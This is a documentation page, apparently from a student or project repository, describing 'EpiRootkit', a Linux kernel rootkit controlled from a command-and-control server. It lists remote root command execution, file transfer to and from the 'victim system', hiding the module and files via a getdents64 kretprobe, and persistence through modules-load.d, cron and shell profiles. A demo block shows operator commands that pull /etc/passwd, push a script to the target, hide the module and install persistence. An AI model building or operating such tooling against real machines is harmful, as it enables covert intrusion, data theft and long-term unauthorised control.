---
title: "Features"
description: "EpiRootkit core functionality and capabilities"
icon: "star"
date: "2025-05-11T18:25:00+01:00"
lastmod: "2025-05-25T00:00:00+01:00"
draft: false
toc: true
weight: 50
---

# EpiRootkit Features

Core functionality implemented in the rootkit.

## Implemented Features

### [Command Execution](./command-execution.md)
- Execute shell commands remotely with root privileges
- Full stdout/stderr capture with exit codes
- Support for complex commands with pipes and flags
- 64KB output limit with dynamic allocation

### [File Transfer](./file-transfer.md)
- Upload files from C2 server to victim system
- Download files from victim system to C2 server
- 10MB file size limit with path validation
- Direct content transmission for text files

### [Stealth & Hiding](./hiding.md)
- Hide rootkit module from `lsmod` and `/proc/modules`
- Hide files with specific prefixes from directory listings
- Dynamic module hiding control via C2 commands
- Syscall hooking using kretprobe on `getdents64`

### [Persistence](./persistence.md)
- Multiple boot persistence mechanisms
- Systemd modules-load.d automatic loading
- Cron-based scheduled loading
- Shell profile login-based loading

## Feature Status

| Feature | Status | Control Method |
|---------|--------|----------------|
| Command Execution | ✅ Working | `exec` command |
| File Upload | ✅ Working | `upload` command |
| File Download | ✅ Working | `download` command |
| Module Hiding | ✅ Working | `hide_module`/`unhide_module` |
| File Hiding | ✅ Working | Automatic (prefix-based) |
| Persistence (modules-load.d) | ✅ Working | `persist` commands |
| Persistence (cron) | ✅ Working | `persist` commands |
| Persistence (profile) | ✅ Working | `persist` commands |
| Authentication | ✅ Working | SHA-512 with rate limiting |
| Keepalive System | ✅ Working | 60-second ping/pong |

## Quick Feature Demo

```bash
# 1. Execute commands
c2-server$ exec Client-1 whoami
# root

# 2. Transfer files
c2-server$ download Client-1 /etc/passwd
c2-server$ upload Client-1 ./script.sh /tmp/script.sh

# 3. Hide module
c2-server$ hide_module Client-1
c2-server$ exec Client-1 lsmod | grep epirootkit
# (no output - hidden)

# 4. Install persistence
c2-server$ persist Client-1 install
# All mechanisms installed

# 5. Check status
c2-server$ status Client-1
# Full rootkit status
```

---

All features are fully implemented and working on Ubuntu 20.04 with kernel 5.4.0.
